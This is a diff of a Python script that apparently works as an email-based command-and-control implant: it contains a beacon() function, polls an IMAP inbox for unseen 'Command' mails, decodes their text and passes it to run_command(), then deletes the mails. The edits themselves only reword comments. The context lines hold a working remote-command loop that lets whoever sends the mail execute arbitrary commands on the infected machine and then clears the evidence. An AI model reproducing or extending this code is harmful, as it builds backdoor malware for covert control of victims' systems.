@@ -28,12 +28,12 @@ def beacon():
 
 def check_for_commands():
     mail.select('inbox')
-    #messages is a list of message ids (relative) that have "TestSubject" in the subject
+    #messages is a list of message ids (relative) that have "Command" in the subject
     _, messages = mail.search(None, '(UNSEEN SUBJECT "Command")')
     for num in messages[0].split():
-        #(RFC882) says to fetch the full raw contents of that email, using RFC 882 standard
+        #RFC882 standard gets full raw content
         _, data = mail.fetch(num, '(RFC822)')
-        raw_email = data[0][1]#email contents at this spot
+        raw_email = data[0][1]#email contents
         parse_and_execute(raw_email)
         mail.store(num, '+FLAGS', '\\Seen')
         mail.expunge()
@@ -41,12 +41,14 @@ def check_for_commands():
 
 def parse_and_execute(raw_email):
     msg = email.message_from_bytes(raw_email)
+    #find text part of multi part email
     if msg.is_multipart():
         for part in msg.walk():
             if part.get_content_type() == 'text/plain':
                 command = part.get_payload(decode=True).decode()
                 run_command(command)
     else:
+        #not multiple, decode the whole thing
         command = msg.get_payload(decode=True).decode()
         run_command(command)
 
